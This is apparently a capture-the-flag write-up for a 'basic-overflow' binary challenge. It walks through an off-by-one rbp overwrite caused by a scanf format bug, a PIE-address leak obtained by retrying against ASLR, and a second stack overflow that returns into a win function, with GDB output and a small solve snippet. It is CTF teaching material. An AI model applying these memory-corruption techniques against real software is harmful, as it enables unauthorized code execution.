# Writeup for "basic-overflow"

## 1. Initial recon

Looking at the c code,
```
	char buf[010];
	printf("What's your name? ");
	scanf("%010s", buf); 
```
We can see that 010 actually only accepts 8 bytes, while %10s accepts 10 bytes + a newline. This gives us a 3 byte overflow (I won't think of this as useful at first, but it's important to consider later). Overflowing with junk data b"A"*10 gives us a segfault.

Using GDB and stepping through the code reveals that the segfault doesn't happen in ret as you'd expect, but interestingly, it happens in the puts call

The overflow is barely enough to modify rbp
` RBP  0x7fffff004141`
with up to 2 bytes of LSB at the end with your arbituary data, and one null byte.

In the puts call, RBP is decremented by 10 and segfaults because there's no data at the overwritten address, being a lot lower than the stack address.

## 2. Looking at the other overflow?

Now, I naturally looked at the scanf 100s overflow, which seems wayy more exploitable 

```
    char s[16];
	char f[32]; // since f is defined after s, f should be before s on the stack
	ff=f; // ff is a pointer to 7f...df80

	/*
	  0x5555555552b8 <main+84>       lea    rax, [rbp - 0x10]     RAX => 0x7fffff003928
 ► 0x5555555552bc <main+88>       mov    rdi, rax              RDI => 0x7fffff003928
   0x5555555552bf <main+91>       call   puts@plt                    <puts@plt>
   leak at somewhat arb addr (value at rbp-0x10 is printed out)
   will segfault if value is not readable
*/
	strcpy(s,"Welcome");
	// 0x7fffffffdef0 —▸ 0x7fffffffdf10 —▸ 0x7fffffffdf40 —▸ 0x7fffffffdf80 —▸ 0x7fffffffdf00 ◂— ...
	// puts will print out the addr 0x7f...df10, while rsp and getname is at df90.

	*(void**)f=getname; // f is now 10 length buffer with name?
	(*(void(**)(void))(f))(); // calls getname
	puts(s);
	printf("Sorry didn't quite catch that... ");
	scanf("%100s", s);

```

I attempted to send it exactly 100 bytes of A's, which resulted in ret trying to return to my overflowed value. Good start! I continued by spraying with a cyclic and found the offset to be roughly ~48 bytes (i dont rmb the exact value). However, PIE is on and doing this doesn't give me the win value, but it's important to keep in mind. 

This could also only overflow the final ret, but not the address of getname during the second call. 100 bytes is simply not enough.

```
scanf("%100s", s); // not enough to overflow. 
    /*
    0x7fffffffdef0: 0x61616161      0x61616161      0x61616161      0x61616161
0x7fffffffdf00: 0x61616161      0x61616161      0x61616161      0x61616161
0x7fffffffdf10: 0x61616161      0x61616161      0x61616161      0x61616161
0x7fffffffdf20: 0x61616161      0x61616161      0x61616161      0x61616161
0x7fffffffdf30: 0x61616161      0x61616161      0x61616161      0x61616161
0x7fffffffdf40: 0x61616161      0x61616161      0x61616161      0x61616161
0x7fffffffdf50: 0x00000000      0x00000000      0xf7ffe310      0x00007fff
0x7fffffffdf60: 0x00000000      0x00000000      0xffffe0e8      0x00007fff
0x7fffffffdf70: 0x00000001      0x00000000      0xf7ffd000      0x00007fff
0x7fffffffdf80: 0xffffdf00      0x00007fff      0x555552f3      0x00005555
0x7fffffffdf90: 0x555551ea      0x00005555  <- Addr of getname      0x00000000      0x00000000 to flow to
    */
```

## 3. A breakthrough??
I tried sending multiple payloads to the first one, that being 'A's of different lengths.
I realised that the only one that worked was 'A's just long enough such that the newline cut off the LSB on RBP.
` RBP  0x7fffffffdf00`
This was able to access valid data at RBP-0x10, rather than segfaulting on me. I initally thought this as a way to obtain a PIE leak, which i could use later to ret towards using the second overflow.

So, i wrote this function to capture whatever came out:

```
    # First getname
    r.sendline(b"x"*8)
    # 1 byte overflow, 00 into last byte of rbp

    leak = r.clean()
    print(leak)
```

However I got stuck debugging my function, as trying to process `leak` proved to be very challenging. no matter how i wrote my code, it would always error out. Sometimes nothing was returned, sometimes i get a stack address, but very rarely i obtained an address starting with 0x55. 

Realising that ASLR is probably an important factor, i wrote a new solve script to keep attempting this until i hit an address starting with 0x55.

After a while, i eventually hit an addr starting with 0x55 and realised it coincided perfectly with the address of getname. 

```
 ► 0x5555555552a1 <main+61>    lea    rax, [rbp - 0x30]                 RAX => 0x7fffffffdf90 ◂— 0
   0x5555555552a5 <main+65>    lea    rdx, [rip - 0xc2]                 RDX => 0x5555555551ea (getname) ◂— push rbp
   0x5555555552ac <main+72>    mov    qword ptr [rax], rdx              [0x7fffffffdf90] <= 0x5555555551ea (getname) ◂— push rbp
   0x5555555552af <main+75>    lea    rax, [rbp - 0x30]                 RAX => 0x7fffffffdf90 —▸ 0x5555555551ea (getname) ◂— push rbp
   0x5555555552b3 <main+79>    mov    rax, qword ptr [rax]              RAX, [0x7fffffffdf90] => 0x5555555551ea (getname) ◂— push rbp
```
It is to be noted that the getname address is first loaded into RDX, then moved into the location of rax (0x30 off from rbp). [Ironically, assembly gave me the hint c code couldnt.]

So, if rbp was located exactly 0x20 from 0x7fffffffdf00, then by clearing it to 00 then subtracting 0x10 from it, getname's address would be outputted through puts.

After getname's address is obtained, we simply need to calculate PIE base and calculate win addr.

After this, I tried the original overflow but discovered that it wouldn't work as expected, and it always returned to the address located at the 00 pos of the second scanf instead of the original calculated value. it was foudn that its because it jumps first to the puts call which locates coincidentally exactly where scanf says. So, no offsets are required and simply writing the win addr into the 00 pos of the second scanf should work.

(Thanks tux for not making this part complicated)

## 4. The final payload

Simply send 8 'x's first, repeat until you receive an address starting with 0x55 (must be getname), calculate pie base and win addr, then write that into second scanf and win.
